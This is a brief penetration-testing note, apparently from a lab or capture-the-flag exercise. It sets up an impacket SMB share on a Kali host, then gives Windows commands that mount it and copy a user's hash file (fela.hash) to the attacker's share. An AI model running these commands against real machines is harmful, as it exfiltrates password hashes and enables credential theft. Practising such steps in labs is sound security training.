kali create smb server at local

```
impacket-smbserver share . -username tester -password test -smb2support

```
windows

```
net use Z: \\KALI_IP\share /user:tester test

```
```
copy C:\Users\fela\Desktop\fela.hash Z:\
